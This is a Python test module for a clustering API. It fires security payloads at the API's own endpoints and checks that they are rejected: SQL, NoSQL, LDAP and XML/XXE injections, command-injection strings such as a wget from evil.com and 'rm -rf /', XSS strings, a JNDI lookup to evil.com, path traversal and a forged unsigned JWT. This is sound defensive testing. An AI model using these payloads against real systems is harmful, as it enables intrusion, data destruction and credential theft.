"""
Security and vulnerability tests for NeuroCluster Streamer API.

This module provides comprehensive security testing including:
- Input validation and sanitization
- Injection attack prevention (SQL, NoSQL, Command)
- Cross-site scripting (XSS) protection
- Cross-site request forgery (CSRF) protection
- Authentication and authorization security
- Rate limiting and DoS protection
- Data exposure and privacy testing
- Security headers validation
- Encryption and data protection
- Session management security
- OWASP Top 10 vulnerability testing
"""

import base64
import hashlib
import json
import secrets
import time
import uuid
from typing import Any, Dict, List
from unittest.mock import MagicMock, patch
from urllib.parse import quote, unquote

import jwt
import pytest
from fastapi.testclient import TestClient

from auth import create_access_token, verify_token

from . import API_ENDPOINTS, TEST_USERS


class TestInputValidationSecurity:
    """Test input validation and sanitization security."""

    def test_sql_injection_prevention(
        self, test_client: TestClient, user_headers: Dict
    ):
        """Test protection against SQL injection attacks."""
        sql_injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; DELETE FROM data_points; --",
            "' UNION SELECT * FROM system_users --",
            "'; INSERT INTO admin_users VALUES ('hacker', 'password'); --",
            "' OR 1=1; UPDATE users SET role='admin' WHERE id=1; --",
        ]

        for payload in sql_injection_payloads:
            # Test in point_id field
            malicious_data = {
                "point_id": payload,
                "features": [1.0, 2.0, 3.0],
                "session_id": str(uuid.uuid4()),
            }

            response = test_client.post(
                API_ENDPOINTS["process_point"],
                json=malicious_data,
                headers=user_headers,
            )

            # Should handle safely without SQL injection
            assert response.status_code in [200, 400, 422]

            # Check response doesn't contain SQL error messages
            response_text = response.text.lower()
            sql_errors = ["syntax error", "sql", "database", "table", "column"]
            for error in sql_errors:
                assert error not in response_text or "error" not in response_text

    def test_nosql_injection_prevention(
        self, test_client: TestClient, user_headers: Dict
    ):
        """Test protection against NoSQL injection attacks."""
        nosql_payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$where": "this.password.length > 0"},
            {"$regex": ".*"},
            {"$or": [{"admin": True}]},
            {"$in": ["admin", "root"]},
        ]

        for payload in nosql_payloads:
            malicious_data = {
                "point_id": json.dumps(payload),
                "features": [1.0, 2.0, 3.0],
                "session_id": str(uuid.uuid4()),
            }

            response = test_client.post(
                API_ENDPOINTS["process_point"],
                json=malicious_data,
                headers=user_headers,
            )

            # Should reject or sanitize NoSQL injection attempts
            assert response.status_code in [200, 400, 422]

    def test_command_injection_prevention(
        self, test_client: TestClient, user_headers: Dict
    ):
        """Test protection against command injection attacks."""
        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "; wget http://evil.com/malware.sh",
            "`whoami`",
            "$(id)",
            "; python -c 'import os; os.system(\"rm -rf /\")'",
            "'; system('cat /etc/passwd'); --",
        ]

        for payload in command_injection_payloads:
            malicious_data = {
                "point_id": f"test{payload}",
                "features": [1.0, 2.0, 3.0],
                "session_id": str(uuid.uuid4()),
            }

            response = test_client.post(
                API_ENDPOINTS["process_point"],
                json=malicious_data,
                headers=user_headers,
            )

            # Should handle safely without command execution
            assert response.status_code in [200, 400, 422]

    def test_xss_prevention(self, test_client: TestClient, user_headers: Dict):
        """Test protection against Cross-Site Scripting (XSS) attacks."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "'\"><script>alert('XSS')</script>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
        ]

        for payload in xss_payloads:
            malicious_data = {
                "point_id": payload,
                "features": [1.0, 2.0, 3.0],
                "session_id": str(uuid.uuid4()),
            }

            response = test_client.post(
                API_ENDPOINTS["process_point"],
                json=malicious_data,
                headers=user_headers,
            )

            # Check response doesn't contain unescaped XSS payload
            if response.status_code == 200:
                response_text = response.text
                # XSS payload should be escaped or rejected
                assert "<script>" not in response_text
                assert "javascript:" not in response_text
                assert "onload=" not in response_text

    def test_ldap_injection_prevention(self, test_client: TestClient):
        """Test protection against LDAP injection attacks."""
        ldap_payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "admin)(&(password=*))",
            "*))(|(cn=*",
        ]

        for payload in ldap_payloads:
            login_data = {"username": payload, "password": "test_password"}

            response = test_client.post(API_ENDPOINTS["auth_login"], data=login_data)

            # Should reject LDAP injection attempts
            assert response.status_code == 401

    def test_xml_injection_prevention(
        self, test_client: TestClient, user_headers: Dict
    ):
        """Test protection against XML injection attacks."""
        xml_payloads = [
            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
            "<?xml version='1.0'?><!DOCTYPE replace [<!ENTITY example 'Doe'>]><userInfo><firstName>John&example;</firstName></userInfo>",
            "<?xml version='1.0'?><!DOCTYPE lolz [<!ENTITY lol 'lol'><!ENTITY lol2 '&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;'>]><lolz>&lol2;</lolz>",
        ]

        for payload in xml_payloads:
            # Try to send XML payload as point_id
            malicious_data = {
                "point_id": payload,
                "features": [1.0, 2.0, 3.0],
                "session_id": str(uuid.uuid4()),
            }

            response = test_client.post(
                API_ENDPOINTS["process_point"],
                json=malicious_data,
                headers=user_headers,
            )

            # Should handle XML content safely
            assert response.status_code in [200, 400, 422]


class TestAuthenticationSecurity:
    """Test authentication security vulnerabilities."""

    def test_jwt_algorithm_confusion_attack(self, test_client: TestClient):
        """Test protection against JWT algorithm confusion attacks."""
        # Try to create token with 'none' algorithm
        payload = {
            "sub": "admin",
            "role": "admin",
            "scopes": ["read", "write", "admin"],
            "exp": int(time.time()) + 3600,
        }

        # Create token with no signature (none algorithm)
        header = (
            base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
            .decode()
            .rstrip("=")
        )

        payload_b64 = (
            base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
        )

        malicious_token = f"{header}.{payload_b64}."

        headers = {"Authorization": f"Bearer {malicious_token}"}

        response = test_client.get("/admin/users", headers=headers)

        # Should reject tokens with 'none' algorithm
        assert response.status_code == 401

    def test_jwt_signature_bypass_attempt(self, test_client: TestClient):
        """Test JWT signature bypass attempts."""
        # Create valid token first
        user_data = {"sub": "regular_user", "role": "user", "scopes": ["read"]}
        valid_token = create_access_token(user_data)

        # Try to modify payload to escalate privileges
        parts = valid_token.split(".")

        # Decode and modify payload
        payload_data = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode())
        payload_data["role"] = "admin"
        payload_data["scopes"] = ["read", "write", "admin"]

        # Re-encode modified payload
        modified_payload = (
            base64.urlsafe_b64encode(json.dumps(payload_data).encode())
            .decode()
            .rstrip("=")
        )

        # Create token with modified payload but original signature
        malicious_token = f"{parts[0]}.{modified_payload}.{parts[2]}"

        headers = {"Authorization": f"Bearer {malicious_token}"}

        response = test_client.get("/admin/users", headers=headers)

        # Should reject token with invalid signature
        assert response.status_code == 401

    def test_token_replay_attack_protection(self, test_client: TestClient):
        """Test protection against token replay attacks."""
        # Create token with short expiration
        user_data = {"sub": "test_user", "role": "user", "scopes": ["read", "write"]}

        from datetime import datetime, timedelta

        short_token = create_access_token(user_data, expires_delta=timedelta(seconds=1))

        # Use token immediately
        headers = {"Authorization": f"Bearer {short_token}"}
        response1 = test_client.get(API_ENDPOINTS["health"], headers=headers)
        assert response1.status_code == 200

        # Wait for token to expire
        time.sleep(2)

        # Try to replay expired token
        response2 = test_client.get(API_ENDPOINTS["health"], headers=headers)
        assert response2.status_code == 401

    def test_brute_force_protection(self, test_client: TestClient):
        """Test protection against brute force attacks."""
        failed_attempts = 0
        max_attempts = 20

        for i in range(max_attempts):
            login_data = {
                "username": "admin@test.com",
                "password": f"wrong_password_{i}",
            }

            response = test_client.post(API_ENDPOINTS["auth_login"], data=login_data)

            if response.status_code == 429:  # Rate limited
                break
            elif response.status_code == 401:  # Unauthorized
                failed_attempts += 1

            # Small delay between attempts
            time.sleep(0.1)

        # Should eventually rate limit or block brute force attempts
        assert failed_attempts < max_attempts or response.status_code == 429

    def test_session_fixation_protection(self, test_client: TestClient):
        """Test protection against session fixation attacks."""
        # This test assumes session management is implemented
        # For JWT-based auth, this is less relevant, but test token rotation

        login_data = {
            "username": TEST_USERS["user"]["email"],
            "password": TEST_USERS["user"]["password"],
        }

        with patch("auth.authenticate_user") as mock_auth:
            mock_auth.return_value = {
                "user_id": TEST_USERS["user"]["user_id"],
                "email": TEST_USERS["user"]["email"],
                "role": TEST_USERS["user"]["role"],
                "scopes": TEST_USERS["user"]["scopes"],
            }

            response = test_client.post(API_ENDPOINTS["auth_login"], data=login_data)

        if response.status_code == 200:
            data = response.json()
            token1 = data.get("access_token")

            # Login again - should get new token
            with patch("auth.authenticate_user") as mock_auth:
                mock_auth.return_value = {
                    "user_id": TEST_USERS["user"]["user_id"],
                    "email": TEST_USERS["user"]["email"],
                    "role": TEST_USERS["user"]["role"],
                    "scopes": TEST_USERS["user"]["scopes"],
                }

                response2 = test_client.post(
                    API_ENDPOINTS["auth_login"], data=login_data
                )

            if response2.status_code == 200:
                data2 = response2.json()
                token2 = data2.get("access_token")

                # Tokens should be different (prevents session fixation)
                assert token1 != token2


class TestAuthorizationSecurity:
    """Test authorization and privilege escalation security."""

    def test_privilege_escalation_prevention(
        self, test_client: TestClient, user_headers: Dict
    ):
        """Test prevention of privilege escalation attacks."""
        # Regular user trying to access admin endpoints
        admin_endpoints = [
            "/admin/users",
            "/admin/config",
            "/admin/logs",
            "/admin/system",
        ]

        for endpoint in admin_endpoints:
            response = test_client.get(endpoint, headers=user_headers)
            assert response.status_code == 403  # Forbidden

    def test_horizontal_privilege_escalation(
        self, test_client: TestClient, user_headers: Dict, seed_test_data
    ):
        """Test prevention of horizontal privilege escalation."""
        # User trying to access another user's session
        session_id = seed_test_data["session"].id

        # Try to access session belonging to different user
        response = test_client.get(f"/session/{session_id}", headers=user_headers)

        # Should either be forbidden or return only authorized data
        if response.status_code == 200:
            data = response.json()
            # Should not contain sensitive data from other users
            assert "password" not in str(data).lower()
            assert "secret" not in str(data).lower()

    def test_insecure_direct_object_reference(
        self, test_client: TestClient, user_headers: Dict
    ):
        """Test protection against insecure direct object references."""
        # Try to access objects by guessing IDs
        object_ids = [
            "1",
            "2",
            "3",  # Simple numeric IDs
            "admin",
            "root",
            "system",  # Common names
            "../admin",
            "../../etc/passwd",  # Path traversal
            str(uuid.uuid4()),  # Random UUID
        ]

        for obj_id in object_ids:
            endpoints = [
                f"/session/{obj_id}",
                f"/clusters/{obj_id}",
                f"/users/{obj_id}",
            ]

            for endpoint in endpoints:
                response = test_client.get(endpoint, headers=user_headers)

                # Should return 404 (not found) or 403 (forbidden), not 200 with unauthorized data
                assert response.status_code in [404, 403, 422]

    def test_role_based_access_bypass(self, test_client: TestClient):
        """Test attempts to bypass role-based access controls."""
        # Create token with manipulated role claims
        malicious_claims = [
            {"role": "admin", "scopes": ["admin"]},
            {"role": "superuser", "scopes": ["read", "write", "admin"]},
            {"role": "system", "scopes": ["*"]},
            {"admin": True, "role": "user"},  # Additional admin claim
            {"scopes": ["admin"], "role": "user"},  # Scope escalation
        ]

        for claims in malicious_claims:
            claims.update({"sub": "malicious_user", "email": "malicious@test.com"})

            # This will fail because we don't have the signing key
            # But test the validation logic
            try:
                token = create_access_token(claims)
                headers = {"Authorization": f"Bearer {token}"}

                response = test_client.get("/admin/users", headers=headers)

                # Even with admin role, should validate user exists and has permissions
                if response.status_code == 200:
                    # If successful, ensure it's properly authorized
                    assert "malicious" not in response.text.lower()

            except Exception:
                # Token creation might fail due to validation
                pass


class TestDataProtectionSecurity:
    """Test data protection and privacy security."""

    def test_sensitive_data_exposure(self, test_client: TestClient, user_headers: Dict):
        """Test prevention of sensitive data exposure."""
        response = test_client.get("/health", headers=user_headers)

        if response.status_code == 200:
            response_text = response.text.lower()

            # Should not expose sensitive information
            sensitive_data = [
                "password",
                "secret",
                "key",
                "token",
                "private",
                "confidential",
                "internal",
                "database_url",
                "api_key",
                "jwt_secret",
            ]

            for sensitive in sensitive_data:
                assert sensitive not in response_text

    def test_error_message_information_disclosure(
        self, test_client: TestClient, user_headers: Dict
    ):
        """Test that error messages don't leak sensitive information."""
        # Trigger various error conditions
        error_requests = [
            {
                "method": "POST",
                "url": "/process-point",
                "json": {"invalid": "data"},
                "headers": user_headers,
            },
            {"method": "GET", "url": "/nonexistent-endpoint", "headers": user_headers},
            {
                "method": "POST",
                "url": "/process-batch",
                "json": None,
                "headers": user_headers,
            },
        ]

        for request in error_requests:
            if request["method"] == "POST":
                response = test_client.post(
                    request["url"], json=request["json"], headers=request["headers"]
                )
            else:
                response = test_client.get(request["url"], headers=request["headers"])

            # Error responses should not contain sensitive info
            if 400 <= response.status_code < 600:
                response_text = response.text.lower()

                # Should not expose system details
                forbidden_info = [
                    "traceback",
                    "stack trace",
                    "file path",
                    "database",
                    "sql",
                    "connection string",
                    "secret",
                    "password",
                    "internal",
                ]

                for info in forbidden_info:
                    assert info not in response_text

    def test_pii_data_handling(self, test_client: TestClient, user_headers: Dict):
        """Test proper handling of personally identifiable information."""
        # Process data that might contain PII
        pii_data = {
            "point_id": "user_email@domain.com",
            "features": [1.0, 2.0, 3.0],
            "session_id": str(uuid.uuid4()),
            "metadata": {"user_id": "12345", "ip_address": "192.168.1.1"},
        }

        response = test_client.post(
            "/process-point", json=pii_data, headers=user_headers
        )

        # Check that PII is not exposed in response
        if response.status_code == 200:
            response_data = response.json()
            response_str = json.dumps(response_data).lower()

            # Should not echo back PII unnecessarily
            assert "192.168.1.1" not in response_str
            assert (
                "user_email@domain.com" not in response_str
                or "point_id" in response_str
            )

    def test_data_masking_in_logs(
        self, test_client: TestClient, user_headers: Dict, captured_logs
    ):
        """Test that sensitive data is masked in logs."""
        sensitive_data = {
            "point_id": "sensitive_user_data",
            "features": [1.0, 2.0, 3.0],
            "session_id": str(uuid.uuid4()),
            "api_key": "secret_api_key_12345",
        }

        response = test_client.post(
            "/process-point", json=sensitive_data, headers=user_headers
        )

        # Check logs don't contain sensitive data
        log_content = captured_logs.getvalue()

        # Sensitive data should be masked or absent from logs
        assert "secret_api_key_12345" not in log_content
        # Point ID might be logged but should be masked if containing sensitive info


class TestNetworkSecurity:
    """Test network-level security measures."""

    def test_security_headers_presence(self, test_client: TestClient):
        """Test presence of required security headers."""
        response = test_client.get(API_ENDPOINTS["health"])

        required_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Referrer-Policy": "strict-origin-when-cross-origin",
            "Content-Security-Policy": lambda x: "default-src" in x,
        }

        for header, expected_value in required_headers.items():
            if header in response.headers:
                if callable(expected_value):
                    assert expected_value(response.headers[header])
                else:
                    assert response.headers[header] == expected_value

    def test_https_enforcement(self, test_client: TestClient):
        """Test HTTPS enforcement through headers."""
        response = test_client.get(API_ENDPOINTS["health"])

        # Should have HSTS header for HTTPS enforcement
        if "Strict-Transport-Security" in response.headers:
            hsts = response.headers["Strict-Transport-Security"]
            assert "max-age=" in hsts
            assert int(hsts.split("max-age=")[1].split(";")[0]) > 0

    def test_cors_configuration_security(self, test_client: TestClient):
        """Test CORS configuration security."""
        # Test preflight request
        response = test_client.options(
            API_ENDPOINTS["health"],
            headers={
                "Origin": "https://malicious-site.com",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Authorization",
            },
        )

        # Should have proper CORS configuration
        if "Access-Control-Allow-Origin" in response.headers:
            allowed_origin = response.headers["Access-Control-Allow-Origin"]
            # Should not allow all origins in production
            assert allowed_origin != "*" or "test" in allowed_origin.lower()

    def test_rate_limiting_security(self, test_client: TestClient, user_headers: Dict):
        """Test rate limiting as DoS protection."""
        # Rapid fire requests to trigger rate limiting
        responses = []
        for i in range(100):
            response = test_client.get(API_ENDPOINTS["health"], headers=user_headers)
            responses.append(response.status_code)

            # Stop if rate limited
            if response.status_code == 429:
                break

        # Should eventually be rate limited
        assert 429 in responses

        # Check rate limit headers if present
        if 429 in responses:
            rate_limited_response = next(
                resp
                for resp in [
                    test_client.get(API_ENDPOINTS["health"], headers=user_headers)
                ]
                if resp.status_code == 429
            )

            # Should provide rate limit information
            rate_headers = [
                "X-RateLimit-Limit",
                "X-RateLimit-Remaining",
                "X-RateLimit-Reset",
                "Retry-After",
            ]

            has_rate_info = any(
                header in rate_limited_response.headers for header in rate_headers
            )
            assert has_rate_info


class TestCryptographicSecurity:
    """Test cryptographic security measures."""

    def test_jwt_signature_verification(self, test_client: TestClient):
        """Test JWT signature verification strength."""
        # Create token with weak signature
        user_data = {"sub": "test_user", "role": "user"}

        # Test with valid token first
        valid_token = create_access_token(user_data)
        verified = verify_token(valid_token)
        assert verified is not None

        # Test with modified signature
        parts = valid_token.split(".")
        tampered_signature = (
            base64.urlsafe_b64encode(b"fake_signature").decode().rstrip("=")
        )
        tampered_token = f"{parts[0]}.{parts[1]}.{tampered_signature}"

        verified_tampered = verify_token(tampered_token)
        assert verified_tampered is None

    def test_password_hashing_strength(self):
        """Test password hashing algorithm strength."""
        from auth import hash_password, verify_password

        password = "test_password_123"
        hashed = hash_password(password)

        # Should use strong hashing (bcrypt)
        assert hashed.startswith("$2b$")  # bcrypt format
        assert len(hashed) > 50  # Reasonable length

        # Should verify correctly
        assert verify_password(password, hashed) is True
        assert verify_password("wrong_password", hashed) is False

    def test_random_token_generation(self):
        """Test cryptographically secure random generation."""
        # Generate multiple tokens/IDs to test randomness
        tokens = []
        for _ in range(100):
            token = secrets.token_urlsafe(32)
            tokens.append(token)

        # All tokens should be unique
        assert len(set(tokens)) == len(tokens)

        # Should have good entropy
        for token in tokens[:10]:
            assert len(token) >= 32
            assert token.isalnum() or "-" in token or "_" in token


class TestBusinessLogicSecurity:
    """Test business logic security vulnerabilities."""

    def test_resource_exhaustion_protection(
        self, test_client: TestClient, user_headers: Dict
    ):
        """Test protection against resource exhaustion attacks."""
        # Try to process extremely large batch
        large_batch = {
            "session_id": str(uuid.uuid4()),
            "data_points": [
                {
                    "id": f"exhaustion_point_{i}",
                    "features": [i * 0.1] * 1000,  # Large feature vector
                }
                for i in range(10000)  # Large number of points
            ],
            "clustering_config": {"similarity_threshold": 0.85, "min_cluster_size": 2},
        }

        start_time = time.time()
        response = test_client.post(
            "/process-batch", json=large_batch, headers=user_headers, timeout=30
        )
        processing_time = time.time() - start_time

        # Should either reject large requests or handle them efficiently
        if response.status_code == 200:
            assert processing_time < 60  # Should complete in reasonable time
        else:
            assert response.status_code in [
                413,
                422,
                429,
            ]  # Request too large or rate limited

    def test_algorithmic_complexity_attack(
        self, test_client: TestClient, user_headers: Dict
    ):
        """Test protection against algorithmic complexity attacks."""
        # Create data designed to trigger worst-case algorithm performance
        worst_case_data = {"session_id": str(uuid.uuid4()), "data_points": []}

        # Generate data that might cause O(n²) or worse behavior
        for i in range(1000):
            # Each point slightly different to potentially create many clusters
            features = [i + 0.00001 * j for j in range(10)]
            worst_case_data["data_points"].append(
                {"id": f"complexity_point_{i}", "features": features}
            )

        start_time = time.time()
        response = test_client.post(
            "/process-batch", json=worst_case_data, headers=user_headers, timeout=30
        )
        processing_time = time.time() - start_time

        # Should handle worst-case scenarios gracefully
        assert processing_time < 30  # Should not take too long
        assert response.status_code in [200, 413, 422, 429]

    def test_concurrent_session_limit(
        self, test_client: TestClient, user_headers: Dict
    ):
        """Test limits on concurrent sessions per user."""
        import threading

        session_responses = []

        def create_session(session_num):
            session_data = {
                "session_id": str(uuid.uuid4()),
                "data_points": [
                    {
                        "id": f"session_{session_num}_point_1",
                        "features": [1.0, 2.0, 3.0],
                    }
                ],
                "clustering_config": {"similarity_threshold": 0.85},
            }

            response = test_client.post(
                "/process-batch", json=session_data, headers=user_headers
            )
            session_responses.append(response.status_code)

        # Try to create many concurrent sessions
        threads = []
        for i in range(20):
            thread = threading.Thread(target=create_session, args=(i,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        # Should either limit concurrent sessions or handle them all
        success_count = sum(1 for status in session_responses if status == 200)
        error_count = sum(1 for status in session_responses if status >= 400)

        # If there are limits, should see some rejections
        if error_count > 0:
            assert success_count > 0  # Some should succeed
            assert error_count > 0  # Some should be limited


class TestComplianceSecurity:
    """Test security compliance requirements."""

    def test_owasp_top_10_a01_broken_access_control(
        self, test_client: TestClient, user_headers: Dict
    ):
        """Test against OWASP A01: Broken Access Control."""
        # Test various access control bypasses
        bypass_attempts = [
            "/admin/../user/profile",  # Path traversal
            "/admin%2e%2e/user/profile",  # URL encoded
            "/admin/./user/profile",  # Directory traversal
            "/admin/users?user_id=../admin",  # Parameter pollution
        ]

        for attempt in bypass_attempts:
            response = test_client.get(attempt, headers=user_headers)
            # Should not bypass access controls
            assert response.status_code in [403, 404, 422]

    def test_owasp_top_10_a02_cryptographic_failures(self, test_client: TestClient):
        """Test against OWASP A02: Cryptographic Failures."""
        # Test weak cryptography detection
        response = test_client.get(API_ENDPOINTS["health"])

        # Should use strong TLS (in production)
        # Check for secure headers
        security_headers = [
            "Strict-Transport-Security",
            "X-Content-Type-Options",
            "X-Frame-Options",
        ]

        for header in security_headers:
            # Headers should be present in security-conscious deployment
            if header in response.headers:
                assert response.headers[header] != ""

    def test_owasp_top_10_a03_injection(
        self, test_client: TestClient, user_headers: Dict
    ):
        """Test against OWASP A03: Injection."""
        # Combined injection test (already covered above, but summarized)
        injection_vectors = [
            {"point_id": "'; DROP TABLE users; --"},  # SQL
            {"point_id": "<script>alert('xss')</script>"},  # XSS
            {"point_id": "; rm -rf /"},  # Command
            {"point_id": "${jndi:ldap://evil.com/exploit}"},  # JNDI
        ]

        for vector in injection_vectors:
            vector.update(
                {"features": [1.0, 2.0, 3.0], "session_id": str(uuid.uuid4())}
            )

            response = test_client.post(
                "/process-point", json=vector, headers=user_headers
            )

            # Should handle all injection attempts safely
            assert response.status_code in [200, 400, 422]

    def test_gdpr_compliance_data_handling(
        self, test_client: TestClient, user_headers: Dict
    ):
        """Test GDPR compliance in data handling."""
        # Test data minimization
        user_data = {
            "point_id": "gdpr_test",
            "features": [1.0, 2.0, 3.0],
            "session_id": str(uuid.uuid4()),
            "unnecessary_data": "should_not_be_stored",
        }

        response = test_client.post(
            "/process-point", json=user_data, headers=user_headers
        )

        # Should only process necessary data
        if response.status_code == 200:
            # Verify unnecessary data is not echoed back
            response_data = response.json()
            assert "unnecessary_data" not in str(response_data)

    def test_audit_logging_compliance(
        self, test_client: TestClient, user_headers: Dict, captured_logs
    ):
        """Test audit logging for compliance."""
        # Perform auditable action
        response = test_client.post(
            "/process-point",
            json={
                "point_id": "audit_test",
                "features": [1.0, 2.0, 3.0],
                "session_id": str(uuid.uuid4()),
            },
            headers=user_headers,
        )

        # Check that action was logged
        log_content = captured_logs.getvalue()

        # Should contain audit information
        audit_elements = ["process", "point", "user", "timestamp"]
        has_audit_info = any(
            element in log_content.lower() for element in audit_elements
        )
        assert has_audit_info


@pytest.mark.security
class TestPenetrationTestingScenarios:
    """Simulated penetration testing scenarios."""

    def test_automated_vulnerability_scan_simulation(self, test_client: TestClient):
        """Simulate automated vulnerability scanning."""
        # Common vulnerability scanner requests
        scan_requests = [
            "/admin/config.php",
            "/wp-admin/",
            "/.env",
            "/config/database.yml",
            "/admin/phpmyadmin/",
            "/backup.sql",
            "/api/v1/../../etc/passwd",
            "/.git/config",
            "/robots.txt/../admin",
        ]

        for request in scan_requests:
            response = test_client.get(request)
            # Should not expose sensitive files or directories
            assert response.status_code in [404, 403]

            # Should not return sensitive information
            if response.status_code == 200:
                response_text = response.text.lower()
                sensitive_indicators = [
                    "password",
                    "secret",
                    "key",
                    "database",
                    "config",
                    "admin",
                    "root",
                    "debug",
                ]
                for indicator in sensitive_indicators:
                    assert indicator not in response_text

    def test_parameter_pollution_attack(
        self, test_client: TestClient, user_headers: Dict
    ):
        """Test HTTP Parameter Pollution attack resistance."""
        # Multiple parameters with same name
        pollution_data = {
            "point_id": ["legitimate_id", "'; DROP TABLE users; --"],
            "features": [[1.0, 2.0, 3.0], [100.0, 200.0, 300.0]],
            "session_id": [str(uuid.uuid4()), "admin_session"],
        }

        # Framework should handle parameter pollution gracefully
        response = test_client.post(
            "/process-point", json=pollution_data, headers=user_headers
        )

        # Should reject malformed requests or handle safely
        assert response.status_code in [200, 400, 422]

    def test_timing_attack_resistance(self, test_client: TestClient):
        """Test resistance to timing attacks."""
        # Test authentication timing
        valid_user = TEST_USERS["user"]["email"]
        invalid_user = "nonexistent@domain.com"
        wrong_password = "definitely_wrong_password"

        # Measure timing for valid vs invalid users
        times = {"valid": [], "invalid": []}

        for i in range(10):
            # Valid user, wrong password
            start = time.time()
            response1 = test_client.post(
                API_ENDPOINTS["auth_login"],
                data={"username": valid_user, "password": wrong_password},
            )
            times["valid"].append(time.time() - start)

            # Invalid user, wrong password
            start = time.time()
            response2 = test_client.post(
                API_ENDPOINTS["auth_login"],
                data={"username": invalid_user, "password": wrong_password},
            )
            times["invalid"].append(time.time() - start)

        # Both should fail
        assert response1.status_code == 401
        assert response2.status_code == 401

        # Timing should be similar (within reasonable variance)
        avg_valid = sum(times["valid"]) / len(times["valid"])
        avg_invalid = sum(times["invalid"]) / len(times["invalid"])
        timing_diff = abs(avg_valid - avg_invalid)

        # Difference should be minimal
        assert timing_diff < 0.1  # Less than 100ms difference

    def test_social_engineering_api_exposure(self, test_client: TestClient):
        """Test API exposure that could aid social engineering."""
        # Check if API exposes user enumeration
        user_enum_endpoints = [
            "/users/admin",
            "/users/test@example.com",
            "/profile/admin",
            "/api/users?email=admin@test.com",
        ]

        for endpoint in user_enum_endpoints:
            response = test_client.get(endpoint)

            # Should not reveal user existence through different response codes
            if response.status_code in [200, 404]:
                # If user lookup is allowed, should require authentication
                assert (
                    response.status_code == 404
                    or "authentication" in response.text.lower()
                )


@pytest.mark.slow
class TestSecurityStressTests:
    """Security stress testing scenarios."""

    def test_ddos_simulation_protection(self, test_client: TestClient):
        """Test DDoS simulation and protection."""
        # Rapid concurrent requests
        import concurrent.futures

        def make_request():
            return test_client.get(API_ENDPOINTS["health"])

        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
            futures = [executor.submit(make_request) for _ in range(200)]
            responses = [future.result() for future in futures]

        status_codes = [r.status_code for r in responses]

        # Should handle high load gracefully
        success_rate = status_codes.count(200) / len(status_codes)
        rate_limited = status_codes.count(429)

        # Either high success rate or proper rate limiting
        assert success_rate > 0.5 or rate_limited > 50

    def test_memory_exhaustion_protection(
        self, test_client: TestClient, user_headers: Dict
    ):
        """Test protection against memory exhaustion attacks."""
        # Large payload attack
        huge_payload = {
            "point_id": "memory_attack",
            "features": [1.0] * 100000,  # Very large feature vector
            "session_id": str(uuid.uuid4()),
            "metadata": {"large_data": "x" * 1000000},  # 1MB of data
        }

        response = test_client.post(
            "/process-point", json=huge_payload, headers=user_headers
        )

        # Should reject or handle large payloads safely
        assert response.status_code in [
            200,
            413,
            422,
        ]  # OK, Payload Too Large, or Validation Error
